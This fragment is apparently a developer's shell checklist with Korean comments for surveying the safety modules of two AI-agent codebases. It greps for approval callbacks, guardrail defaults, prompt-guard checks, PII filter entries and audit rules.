    hits=[p.pattern for p in sr.DANGEROUS_COMMAND_PATTERNS if p.search(cmd)]
    print(f'{cmd:22} -> {hits[0][:40] if hits else \"clean\"}')"

# hermes 부착 지점 실재 확인
cd ~/Works/hermes-agent
grep -n "^def set_approval_callback" tools/terminal_tool.py tools/computer_use/tool.py
grep -n "^class AIAgent" run_agent.py
grep -n "^def _ensure_plugins_discovered" hermes_cli/plugins.py
grep -n "_callback_tls = threading.local()" tools/terminal_tool.py   # thread-local 확인

# ARGO safety 모듈 전수 조사
cd ~/Works/ARGO-ClawKeeper
find tinicore/src tinicore-traits/src -type d \( -name "*guard*" -o -name "*sensitive*" \
  -o -name "*security*" -o -name "*policy*" \)

# 활성화 판정 근거
grep -n -A 10 '^default = \[' tinicore/Cargo.toml          # guardrails 부재
grep -n '^default = ' tinicli/Cargo.toml argo-cli/Cargo.toml
sed -n '1060,1095p' tinicore/src/agent/guardrails.rs        # env 없으면 None
grep -n "prompt_guard.is_empty" tinicore/src/agent/loop_.rs
grep -rn "audit_text(" tinicore/src --include="*.rs" | grep -v dispatchable_policy/audit.rs
grep -n "finalize_result_safety" tinicore/src/tools/tool_orchestrator/execution.rs

# 수치 확인
grep -c 'pii_type:' tinicore/src/guardrails/config/pii_filter_config.yaml   # 49
grep -c '^    Rule {' tinicore/src/dispatchable_policy/audit.rs             # 23
```
